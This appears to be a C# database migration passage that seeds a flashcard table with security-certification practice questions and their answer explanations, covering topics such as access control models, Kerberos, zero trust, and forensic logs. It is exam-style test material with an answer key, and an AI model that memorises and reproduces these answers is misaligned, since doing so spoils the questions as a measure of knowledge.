                values: new object[] { 570, "\r\n164. A. This image shows a forward proxy, which can be used to\r\napply policies to user requests sent to web servers and other\r\nservices. Reverse proxies act as gateways between users and\r\napplication servers, allowing content caching and traffic\r\nmanipulation. They are often used by content delivery networks\r\nto help with traffic management.\r\n", 3, "\r\n164. This image shows a type of proxy. What type of proxy is shown?\r\nUser sends a connection request, and\r\nthe proxy responds, and terminates\r\nthe initial connection request.\r\nProxy sends the request to the\r\nremote server destination, applying\r\npolicies as required.\r\nA. A forward proxy\r\nB. A boomerang proxy\r\nC. A next generation proxy\r\nD. A reverse proxy\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 571, "\r\n165. B. This type of potential security issue is typically recorded as\r\nan impossible travel time/risky login issue. Gurvinder would not\r\nexpect the user to have traveled between two locations in an\r\nhour—in fact, it is impossible to do so. That means he needs to\r\ncontact the user to find out if they may have done something like\r\nuse a VPN, or if their account may be compromised. It is\r\npossible this could be an issue with the geo-IP system that\r\nGurvinder’s company uses, but he needs to treat it like a security\r\nrisk until he determines otherwise, and a compromise is more\r\nlikely in most cases. A misconfigured IP address would not cause\r\nthis issue.\r\n", 3, "\r\n165. Gurvinder is reviewing log files for authentication events and notices that one of his users\r\nhas logged in from a system at his company’s home office in Chicago. Less than an hour\r\nlater, the same user is recorded as logging in from an IP address that geo-IP tools say comes\r\nfrom Australia. What type of issue should he flag this as?\r\nA. A misconfigured IP address\r\nB. An impossible travel time, risky login issue\r\nC. A geo-IP lookup issue\r\nD. None of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 572, "\r\n166. A. Discretionary access control (DAC) allows data owners to\r\nassign permissions. Role-based access control (RBAC) assigns\r\naccess based on the role the user is in. Mandatory access control\r\n(MAC) is stricter and enforces control at the OS level. Attributecased\r\naccess control (ABAC) considers various attributes such as\r\nlocation, time, and computer in addition to username and\r\npassword.\r\n", 3, "\r\n166. Users in your network are able to assign permissions to their own shared resources. Which\r\nof the following access control models is used in your network?\r\nA. DAC\r\nB. RBAC\r\nC. MAC\r\nD. ABAC\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 573, "\r\n167. A. OS hardening is the process of securing an operating system\r\nby patching, updating, and configuring the operating system to\r\nbe secure. Configuration management is the ongoing process of\r\nmanaging configurations for systems, rather than this initial\r\nsecurity step. Both security uplift and endpoint lockdown were\r\nmade up for this question.\r\n", 3, "\r\n167. Cynthia is preparing a new server for deployment and her process includes turning off\r\nunnecessary services, setting security settings to match her organization’s baseline configurations,\r\nand installing patches and updates. What is this process known as?\r\nA. OS hardening\r\nB. Security uplift\r\nC. Configuration management\r\nD. Endpoint lockdown\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 574, "\r\n168. D. Secure Lightweight Directory Access Protocol (LDAPS) uses\r\nport 636 by default. DNS uses port 53, LDAP uses 389, and\r\nsecure HTTP uses port 443.\r\n", 3, "\r\n168. John is performing a port scan of a network as part of a security audit. He notices that the\r\ndomain controller is using secure LDAP. Which of the following ports would lead him to\r\nthat conclusion?\r\nA. 53\r\nB. 389\r\nC. 443\r\nD. 636\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 575, "\r\n169. C. The best answer for the needs Chris has identified is a\r\nhardware security module, or HSM. HSMs can act as a\r\ncryptographic key manager, including creating, storing, and\r\nsecurely handling encryption keys and certificates. They can also\r\nact as cryptographic accelerators, helping offload encryption\r\nfunctions like Transport Layer Security (TLS) encryption. A\r\nTPM (Trusted Platform Module) is a device used to store keys\r\nfor a system but does not offload cryptoprocessing, and it is used\r\nfor keys on a specific system rather than broader uses. CPUs and\r\nGPUs may have cryptographic acceleration functions, but they\r\ndo not securely store or manage certificates and other\r\nencryption artifacts.\r\n", 3, "\r\n169. Chris wants to securely generate and store cryptographic keys for his organization’s servers,\r\nwhile also providing the ability to offload TLS encryption processing. What type of solution\r\nshould he recommend?\r\nA. A GPU in cryptographic acceleration mode\r\nB. A TPM\r\nC. A HSM\r\nD. A CPU in cryptographic acceleration mode\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 576, "\r\n170. D. A host-based intrusion prevention system (HIPS) can\r\nmonitor network traffic to identify attacks, suspicious behavior,\r\nand known bad patterns using signatures. A firewall stops traffic\r\nbased on rules; antimalware tools are specifically designed to\r\nstop malware, not attacks and suspicious network behavior; and\r\na host-based intrusion detection system (HIDS) can only detect,\r\nnot stop, these behaviors.\r\n", 3, "\r\n170. Tracy wants to protect desktop and laptop systems in her organization from network\r\nattacks. She wants to deploy a tool that can actively stop attacks based on signatures, heuristics,\r\nand anomalies. What type of tool should she deploy?\r\nA. A firewall\r\nB. Antimalware\r\nC. HIDS\r\nD. HIPS\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 577, "\r\n171. B. Role-based access control (RBAC) grants permissions based\r\non the user’s position within the organization. Mandatory access\r\ncontrol (MAC) uses security classifications to grant permissions.\r\nDiscretionary access control (DAC) allows data owners to set\r\npermissions. Attribute-based access control (ABAC) considers\r\nvarious attributes such as location, time, and computer, in\r\naddition to username and password.\r\n", 3, "\r\n171. Which of the following access control methods grants permissions based on the user’s position\r\nin the organization?\r\nA. MAC\r\nB. RBAC\r\nC. DAC\r\nD. ABAC\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 592, "\r\n186. C. Conditional access assesses specific conditions to make a\r\ndetermination about whether to allow an account to access a\r\nresource. The system may choose to allow access, to block\r\naccess, or to apply additional controls based on the conditions\r\nthat are present and the information that is available about the\r\nlogin.\r\n", 3, "\r\n186. Fred sets up his authentication and authorization system to apply the following rules to\r\nauthenticated users:\r\n- Users who are not logging in from inside the trusted network must use multifactor\r\nauthentication.\r\n- Users whose devices have not passed a NAC check must use multifactor authentication.\r\n- Users who have logged in from geographic locations that are more than 100 miles apart\r\nwithin 15 minutes will be denied.\r\nWhat type of access control is Fred using?\r\nA. Geofencing\r\nB. Time-based logins\r\nC. Conditional access\r\nD. Role-based access\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 578, "\r\n172. B. Measured boot provides a form of boot attestation that\r\nrecords information about each component loaded during the\r\nboot process. This information can then be reported to a server\r\nfor validation. Trusted boot validates each component against a\r\nknown signature. Measured boot does not care about the time to\r\nboot up, nor does it update the system’s Unified Extensible\r\nFirmware Interface (UEFI).\r\n", 3, "\r\n172. What does UEFI measured boot do?\r\nA. Records how long it takes for a system to boot up\r\nB. Records information about each component that is loaded, stores it in the TPM, and\r\ncan report it to a server\r\nC. Compares the hash of every component that is loaded against a known hash stored in\r\nthe TPM\r\nD. Checks for updated versions of the UEFI, and compares it to the current version; if it\r\nis measured as being too far out of date, it updates the UEFI\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 580, "\r\n174. C. Although patching devices is important, the most effective\r\nway to protect devices from being attacked via administrative\r\naccount brute forcing is to place the devices on a separate\r\nmanagement virtual LAN (VLAN) and then control access to\r\nthat VLAN. This will prevent most attackers from being able to\r\nconnect to the device’s administrative interfaces. Disabling\r\nadministrative access may not be possible, and even if it was, it\r\nwould create significant problems when the devices needed to\r\nhave changes made on them.\r\n", 3, "\r\n174. Maria wants to ensure that her wireless controller and access points are as secure as possible\r\nfrom attack via her network. What control should she put in place to protect them\r\nfrom brute-force password attacks and similar attempts to take over her wireless network’s\r\nhardware infrastructure?\r\nA. Regularly patch the devices.\r\nB. Disable administrative access.\r\nC. Put the access points and controllers on a separate management VLAN.\r\nD. All of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 581, "\r\n175. A. While mobile device management (MDM) and unified\r\nendpoint management (UEM) tools provide many capabilities,\r\ncarrier unlock status normally needs to be checked with the\r\ncarrier if you want to validate corporate-owned phones without\r\nmanually checking each device.\r\n", 3, "\r\n175. Marcus wants to check on the status of carrier unlocking for all mobile phones owned by\r\nand deployed by his company. What method is the most effective way to do this?\r\nA. Contact the cellular provider.\r\nB. Use an MDM tool.\r\nC. Use a UEM tool.\r\nD. None of the above; carrier unlock must be verified manually on the phone.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 582, "\r\n176. A. Zero-trust environments typically have a more complex\r\nnetwork due to increased segmentation to isolate systems and\r\ndevices that have different security contexts. Zero-trust\r\nnetworks also require strong identity and access management,\r\nand they use application-aware firewalls extensively to preserve\r\nleast privilege. Of course, logging and analysis of security events\r\nis necessary to ensure that issues are identified and responded\r\nto.\r\n", 3, "\r\n176. Michael wants to implement a zero-trust network. Which of the following steps is not a\r\ncommon step in establishing a zero trust network?\r\nA. Simplify the network.\r\nB. Use strong identity and access management.\r\nC. Configure firewalls for least privilege and application awareness.\r\nD. Log security events and analyze them.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 583, "\r\n177. A. Digital certificates use the X.509 standard (or the PGP\r\nstandard) and allow the user to digitally sign authentication\r\nrequests. OAuth allows an end user’s account information to be\r\nused by third-party services, without exposing the user’s\r\npassword. It does not use digital certificates or support digital\r\nsigning. Kerberos does not use digital certificates, nor does it\r\nsupport digitally signing. Smartcards can contain digital\r\ncertificates but don’t necessarily have to have them.\r\n", 3, "\r\n177. Samantha is looking for an authentication method that incorporates the X.509 standard\r\nand will allow authentication to be digitally signed. Which of the following authentication\r\nmethods would best meet these requirements?\r\nA. Certificate-based authentication\r\nB. OAuth\r\nC. Kerberos\r\nD. Smartcards\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 584, "\r\n178. C. SAML (Security Assertion Markup Language) is an\r\nExtensible Markup Language (XML) framework for creating and\r\nexchanging security information between partners online. The\r\nintegrity of users is the weakness in the SAML identity chain. To\r\nmitigate this risk, SAML systems need to use timed sessions,\r\nHTTPS, and SSL/TLS. LDAP (Lightweight Directory Access\r\nProtocol) is a protocol that enables a user to locate individuals\r\nand other resources such as files and devices in a network.\r\nTerminal Access Controller Access Control System Plus\r\n(TACACS+) is a protocol that is used to control access into\r\nnetworks. TACACS+ provides authentication and authorization\r\nin addition to an accounting of access requests against a central\r\ndatabase. Transitive trust is a two-way relationship that is\r\nautomatically created between a parent and a child domain in a\r\nMicrosoft Active Directory (AD) forest. It shares resources with\r\nits parent domain by default and enables an authenticated user\r\nto access resources in both the child and parent domains.\r\n", 3, "\r\n178. Your company relies heavily on cloud and SaaS service providers such as salesforce\r\n.com, Office365, and Google. Which of the following would you have security concerns\r\nabout?\r\nA. LDAP\r\nB. TACACS+\r\nC. SAML\r\nD. Transitive trust\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 585, "\r\n179. C. UEM, or unified endpoint management, manages desktop,\r\nlaptops, mobile devices, printers, and other types of devices.\r\nMobile device management (MDM) tools focus on mobile\r\ndevices.\r\n", 3, "\r\n179. What is the primary difference between MDM and UEM?\r\nA. MDM does not include patch management.\r\nB. UEM does not include support for mobile devices.\r\nC. UEM supports a broader range of devices.\r\nD. MDM patches domain machines, not enterprise machines.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 586, "\r\n180. B. Host-based firewalls are the first step in most designs when\r\nprotecting against network-borne threats. They can prevent\r\nunwanted traffic from entering or leaving the host, leaving less\r\ntraffic for a host-based intrusion prevention system (HIPS) or\r\nother tools to analyze. Full-disk encryption (FDE) will not stop\r\nnetwork-borne threats, and antivirus focuses on prevention of\r\nmalware, not network threats like denial of service or\r\nexploitation of vulnerable services.\r\n", 3, "\r\n180. Kathleen wants to implement a zero-trust network design and knows that she should segment\r\nthe network. She remains worried about east/west traffic inside the network segments.\r\nWhat is the first security tool she should implement to ensure hosts remain secure from network\r\nthreats?\r\nA. Antivirus\r\nB. Host-based firewalls\r\nC. Host-based IPS\r\nD. FDE\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 587, "\r\n181. A. Security groups are a virtual firewall for instances, allowing\r\nrules to be applied to traffic between instances. Dynamic\r\nresource allocation is a concept that allows resources to be\r\napplied as they are needed, including scaling up and down\r\ninfrastructure and systems on the fly. Virtual private cloud\r\n(VPC) endpoints are a way to connect to services inside of a\r\ncloud provider without an Internet gateway. Finally, instance\r\nawareness is a concept that means that tools know about the\r\ndifferences between instances, rather than treating each\r\ninstance in a scaling group as the same. This can be important\r\nduring incident response processes and security monitoring for\r\nscaled groups, where resources may all appear identical without\r\ninstance awareness.\r\n", 3, "\r\n181. Gary is designing his cloud infrastructure and needs to provide a firewall-like capability\r\nfor the virtual systems he is running. Which of the following cloud capabilities acts like a\r\nvirtual firewall?\r\nA. Security groups\r\nB. Dynamic resource allocation\r\nC. VPC endpoints\r\nD. Instance awareness\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 588, "\r\n182. D. Although built-in update tools will handle the operating\r\nsystem, additional software installed on systems needs to be\r\npatched separately. Third-party software and firmware,\r\nincluding the Unified Extensible Firmware Interface (UEFI) or\r\nBIOS of the systems that are deployed in Derek’s organization,\r\nwill need regular updates. Many organizations adopt patch\r\nmanagement platforms or system management platforms with\r\npatching capabilities to ensure that this occurs on a broader\r\nbasis than just OS patches.\r\n", 3, "\r\n182. Derek has enabled automatic updates for the Windows systems that are used in the small\r\nbusiness he works for. What hardening process will still need to be tackled for those systems\r\nif he wants a complete patch management system?\r\nA. Automated installation of Windows patches\r\nB. Windows Update regression testing\r\nC. Registry hardening\r\nD. Third-party software and firmware patching\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 589, "\r\n183. A. IDSs, or intrusion detection systems, can only detect\r\nunwanted and malicious traffic based on the detection rules and\r\nsignatures that they have. They cannot stop traffic or modify it.\r\nAn IPS, or intrusion prevention system, that is placed inline with\r\nnetwork traffic can take action on that traffic. Thus, IDSs are\r\noften used when it is not acceptable to block network traffic, or\r\nwhen a tap or other network device is used to clone traffic for\r\ninspection.\r\n", 3, "\r\n183. Theresa implements a network-based IDS. What can she do to traffic that passes\r\nthrough the IDS?\r\nA. Review the traffic based on rules and detect and alert about unwanted or undesirable\r\ntraffic.\r\nB. Review the traffic based on rules and detect and stop traffic based on those rules.\r\nC. Detect sensitive data being sent to the outside world and encrypt it as it passes\r\nthrough the IDS.\r\nD. All of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 590, "\r\n184. C. Although insider threats are a concern, they’re not any\r\ndifferent for containers than any other system. Ensuring\r\ncontainer host security, securing the management stack, and\r\nmaking sure that network traffic to and from containers is\r\nsecure are all common container security concerns.\r\n", 3, "\r\n184. Murali is building his organization’s container security best practices document and wants\r\nto ensure that he covers the most common items for container security. Which of the following\r\nis not a specific concern for containers?\r\nA. The security of the container host\r\nB. Securing the management stack for the container\r\nC. Insider threats\r\nD. Monitoring network traffic to and from the containers for threats and attacks\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 579, "\r\n173. D. The key distribution center (KDC) issues tickets. The tickets\r\nare generated by the ticket-granting service, which is usually\r\npart of the KDC. The authentication service simply authenticates\r\nthe user, X.509 certificates and certificate authorities are not\r\npart of Kerberos, and the ticket-granting service does generate\r\nthe ticket but the KDC issues it.\r\n", 3, "\r\n173. Kerberos uses which of the following to issue tickets?\r\nA. Authentication service\r\nB. Certificate authority\r\nC. Ticket-granting service\r\nD. Key distribution center\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 566, "\r\n160. C. Megan has created a guest account. Guest accounts typically\r\nhave very limited privileges and may be set up with limited login\r\nhours, an expiration date, or other controls to help keep them\r\nmore secure. User accounts are the most common type of\r\naccount and are issued to individuals to allow them to log into\r\nand use systems and services. Shared accounts are used by more\r\nthan one person, making it difficult to determine who used the\r\naccount. A service account is typically associated with a program\r\nor service running on a system that requires rights to files or\r\nother resources.\r\n", 3, "\r\n160. Megan wants to set up an account that can be issued to visitors. She configures a kiosk\r\napplication that will allow users in her organization to sponsor the visitor, set the amount\r\nof time that the user will be on-site, and then allow them to log into the account, set a password,\r\nand use Wi-Fi and other services. What type of account has Megan created?\r\nA. A user account\r\nB. A shared account\r\nC. A guest account\r\nD. A service account\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 620, "\r\n214. B. Security Enhanced Linux (SELinux) allows mandatory\r\naccess control for Linux-based systems, and SEAndroid is an\r\nAndroid implementation of SELinux. That means that Isaac can\r\nuse SEAndroid to accomplish his goals. Android does use a\r\nregistry, but there is no MAC mode. MACDroid was made up for\r\nthis question, and single-user mode does not make Android a\r\nMAC-based system.\r\n", 3, "\r\n214. Isaac wants to implement mandatory access controls on an Android-based device. What can\r\nhe do to accomplish this?\r\nA. Run Android in single-user mode.\r\nB. Use SEAndroid.\r\nC. Change the Android registry to MAC mode.\r\nD. Install MACDroid.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 622, "\r\n216. A. Using a mobile device management (MDM) tool that allows\r\ncontrol of the devices would allow Alaina to lock out the\r\ncameras, preventing staff members from using the Android\r\ntablets to take pictures. She would still need to ensure that her\r\nstaff did not bring their own camera equipped devices into the\r\nfacility. DLP is data loss prevention, OPAL is an encryption\r\nstandard for drives, and MMC has a number of meanings,\r\nincluding multimedia cards and Microsoft Management Console\r\nsnap-ins for Windows systems, none of which would provide the\r\ncontrol she needs.\r\n", 3, "\r\n216. Alaina has issued Android tablets to staff in her production facility, but cameras are banned\r\ndue to sensitive data in the building. What type of tool can she use to control camera use on\r\nall of her organization’s corporate devices that she issues?\r\nA. MDM\r\nB. DLP\r\nC. OPAL\r\nD. MMC\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 651, "\r\n19. D. The most common reason for a one-hour time offset\r\nbetween two systems in the same location is a faulty time zone\r\nsetting creating a time offset between the systems.\r\n", 4, "\r\n19. While Susan is conducting a forensic review of logs from two servers hosted in the same datacenter,\r\nshe notices that log items on the first server occurred exactly an hour before matching\r\nevents on the second server. What is the most likely cause of such exact occurrences?\r\nA. The attack took an hour to complete, providing the attacker with access to the second\r\nmachine an hour later.\r\nB. The log entries are incorrect, causing the events to appear at the wrong time.\r\nC. The attacker used a script causing events to happen exactly an hour apart.\r\nD. A time offset is causing the events to appear to occur at different times.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 652, "\r\n20. C. DNS data is frequently logged to help identify compromised\r\nsystems or systems that have visited known phishing sites. DNS\r\nlogs can be used along with IP reputation and known bad\r\nhostname lists to identify issues like these. DNS data is not\r\ncommonly used to identify network scans and cannot capture\r\nthem. Domain transfers are not attacks, although they are\r\ninformation gathering and will show in the logs. DNS does not\r\ncapture information about logins.\r\n", 4, "\r\n20. What is the primary usage of Domain Name System (DNS) data in incident investigations\r\nand operational security monitoring?\r\nA. DNS data is used to capture network scans.\r\nB. DNS data can be used to identify domain transfer attacks.\r\nC. DNS log information can be used to identify malware going to known malicious sites.\r\nD. DNS log information can be used to identify unauthorized logins.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 653, "\r\n21. D. Even if you’re not deeply familiar with the openssl\r\ncommand-line utility, you should know that certificates use\r\nciphers that accept a bit length as a flag and that bit lengths like\r\n1024, 2048, and 4096 are common. These key lengths are not\r\ncommonly communicated in bytes, and certificates are unlikely\r\nto last for multiple decades, although a certificate authority (CA)\r\nroot certificate can last for a long time.\r\n", 4, "\r\n21. Dani generates an OpenSSL certificate using the following command. What has she set with\r\nthe flag -rsa:2048?\r\nopenssl req -x509 -sha256 -nodes -days 365 -newkey rsa:2048\r\n-keyout privateKey.key -out mycert.crt\r\nA. The year that the certificate will expire\r\nB. The key length in bytes\r\nC. The year that the root certificate will expire\r\nD. The key length in bits\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 654, "\r\n22. B. By default, the tail command shows the last 10 lines of a\r\nfile, and using the -f flag follows changes in the file. head shows\r\nthe top of a file, and foot and follow were made up for this\r\nquestion.\r\n", 4, "\r\n22. Theresa wants to view the last 10 lines of a log file and to see it change as modifications are\r\nmade. What command should she run on the Linux system she is logged in to?\r\nA. head -f -end 10 logfile.log\r\nB. tail -f logfile.log\r\nC. foot -watch -l 10 logfile.log\r\nD. follow -tail 10 logfile.log\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 655, "\r\n23. B. Although firmware acquisition is a less commonly used\r\ntechnique, firmware is typically stored in a chip on a system\r\nboard rather than on disk. Henry is most likely to succeed if he\r\nretrieves the running firmware from memory. A serial\r\nconnection may work but would typically require rebooting the\r\nsystem.\r\n", 4, "\r\n23. Henry wants to acquire the firmware from a running system. What is the most likely technique\r\nthat he will need to use to acquire the firmware?\r\nA. Connect using a serial cable.\r\nB. Acquire the firmware from memory using memory forensics tools.\r\nC. Acquire the firmware from disk using disk forensic tools.\r\nD. None of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 656, "\r\n24. B. Network flows using NetFlow or sFlow would provide the\r\ninformation that Eric wants, with details of how much traffic\r\nwas used, when, and where traffic was directed. A firewall or\r\ndata loss prevention (DLP) would not show the bandwidth\r\ndetail, although a firewall may show the connection information\r\nfor events. Packetflow was made up for this question and is not a\r\ntechnology used for this purpose.\r\n", 4, "\r\n24. Eric wants to determine how much bandwidth was used during a compromise and where the\r\ntraffic was directed to. What technology can he implement before the event to help him see\r\nthis detail and allow him to have an effective bandwidth monitoring solution?\r\nA. A firewall\r\nB. NetFlow\r\nC. packetflow\r\nD. A DLP\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 657, "\r\n25. D. Hashing using MD5 or SHA1 is commonly used to validate\r\nthat a forensic image matches the original drive. Many forensic\r\nduplicators automatically generate a hash of both drives when\r\nthey complete the imaging process to ensure that there is a\r\ndocumentation chain for the forensic artifacts. A third image\r\nmay be useful but does not validate this. Directory listings do\r\nnot prove that drives match, and photos, though useful to\r\ndocument the drives and serial numbers, do not validate the\r\ncontents of the drives.\r\n", 4, "\r\n25. Naomi has acquired an image of a drive as part of a forensic process. She wants to ensure\r\nthat the drive image matches the original. What should she create and record to validate this?\r\nA. A third image to compare to the original and new image\r\nB. A directory listing to show that the directories match\r\nC. A photographic image of the two drives to show that they match\r\nD. A hash of the drives to show that their hashes match\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 658, "\r\n26. B. Nessus is a popular vulnerability scanning tool. It is not a\r\nfuzzer, web application firewall (WAF), or protocol analyzer.\r\n", 4, "\r\n26. Ryan has been asked to run Nessus on his network. What type of tool has he been\r\nasked to run?\r\nA. A fuzzer\r\nB. A vulnerability scanner\r\nC. A WAF\r\nD. A protocol analyzer\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 659, "\r\n27. A. Of the options listed, the only requirement for admissibility\r\nis that the evidence must be relevant. Evidence must also be\r\nauthenticated, meaning that it needs to be genuine.\r\n", 4, "\r\n27. Jason wants to ensure that the digital evidence he is collecting during his forensic investigation\r\nis admissible. Which of the following is a common requirement for admissibility\r\nof evidence?\r\nA. It must be relevant.\r\nB. It must be hearsay.\r\nC. It must be timely.\r\nD. It must be public.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 660, "\r\n28. D. The cost to the organization is not typically a part of\r\ncommunications planning. Since incidents can have a broad\r\nrange of costs, and since exposing those costs can cause worry or\r\na loss of customer confidence in the worst case, the costs of the\r\nincident are relatively rarely exposed as part of the incident\r\nresponse process. Communications with customers and\r\nemployees is critical, and having different communication plans\r\nfor different event severities helps ensure that appropriate\r\ncommunications occur.\r\n", 4, "\r\n28. Which of the following key elements is not typically included in the design of a communication\r\nplan?\r\nA. Incident severity\r\nB. Customer impact\r\nC. Employee impact\r\nD. Cost to the organization\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 661, "\r\n29. B. The cat command without an angle bracket to redirect it will\r\nsimply display the contents of the files listed. Thus, this\r\ncommand will display file1.txt , and then file2.txt . If Rick\r\nhad inserted > between the two files, it would have appended\r\nfile1.txt to file2.txt .\r\n", 4, "\r\n29. Rick runs the following command:\r\ncat file1.txt file2.txt\r\nWhat will occur?\r\nA. The contents of file1.txt will be appended to file2.txt.\r\nB. The contents of file1.txt will be displayed, and then the contents of file2 will be\r\ndisplayed.\r\nC. The contents of file2.txt will be appended to file1.txt.\r\nD. The contents of both files will be combined line by line.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 650, "\r\n18. B. Stakeholder management involves working with\r\nstakeholders, or those who have an interest in the event or\r\nimpacted systems or services. COOP, or Continuity of\r\nOperations Planning, is a U.S. federal government effort to\r\nensure that federal agencies have continuity plans. PAM is\r\nprivileged account management. Stakeholder management\r\ninvolves more than just communications, although\r\ncommunications is an important part of it.\r\n", 4, "\r\n18. Jacob wants to ensure that all of the areas that are impacted by an incident are addressed by\r\nhis incident response team. What term is used to describe the relationship and communications\r\nprocess that teams use to ensure that all of those involved are treated appropriately?\r\nA. COOP\r\nB. Stakeholder management\r\nC. PAM\r\nD. Communications planning\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 662, "\r\n30. D. CentOS and Red Hat both store authentication log\r\ninformation in /var/log/secure instead of /var/log/auth.log\r\nused by Debian and Ubuntu systems. Knowing the differences\r\nbetween the major distributions can help speed up your forensic\r\nand incident investigations, and consistency is one of the\r\nreasons that organizations often select a single Linux\r\ndistribution for their infrastructure whenever it is possible to do\r\nso.\r\n", 4, "\r\n30. Michelle wants to check for authentication failures on a CentOS Linux–based system. Where\r\nshould she look for these event logs?\r\nA. /var/log/auth.log\r\nB. /var/log/fail\r\nC. /var/log/events\r\nD. /var/log/secure\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 664, "\r\n32. C. Cuckoo , or Cuckoo Sandbox, is a malware analysis sandbox\r\nthat will safely run malware and then analyze and report on its\r\nbehavior. strings is a command-line tool that retrieves strings\r\nfrom binary data. scanless is a tool described as a port scraper,\r\nwhich retrieves port information without running a port scan by\r\nusing websites and services to run the scan for you. Sn1per is a\r\npen test framework.\r\n", 4, "\r\n32. Nelson has discovered malware on one of the systems he is responsible for and wants to test\r\nit in a safe environment. Which of the following tools is best suited to that testing?\r\nA. strings\r\nB. scanless\r\nC. Cuckoo\r\nD. Sn1per\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 665, "\r\n33. C. Although Autopsy, strings , and grep can all be used to\r\nretrieve information from files, exiftool is the only purposebuilt\r\nfile metadata retrieval tool listed.\r\n", 4, "\r\n33. Lucca wants to view metadata for a file so that he can determine the author of the file. What\r\ntool should he use from the following list?\r\nA. Autopsy\r\nB. strings\r\nC. exiftool\r\nD. grep\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
